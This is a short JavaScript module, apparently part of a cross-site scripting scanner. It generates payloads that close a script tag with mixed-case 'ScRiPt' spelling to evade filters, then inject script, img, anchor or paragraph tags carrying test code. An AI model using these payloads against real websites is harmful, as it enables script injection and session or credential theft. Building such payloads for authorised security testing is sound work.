function scriptPayloads({jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
    return [{
        payload: ` ${jsCode} `,
        assert,
    }, {
        payload: `</ScRiPt>${scriptTag}`,
        assert,
    }, {
        payload: `</ScRiPt>${imgTag}`,
        assert,
    }, {
        payload: `</ScRiPt>${aTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `</ScRiPt>${pTag}`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `</ScRiPt>${scriptTag}<ScrIPt>`,
        assert,
    }, {
        payload: `</ScRiPt>${imgTag}<ScrIPt>`,
        assert,
    }, {
        payload: `</ScRiPt>${aTag}<ScrIPt>`,
        trigger: tagTrigger,
        assert,
    }, {
        payload: `</ScRiPt>${pTag}<ScrIPt>`,
        trigger: tagTrigger,
        assert,
    },];
}

module.exports = scriptPayloads;
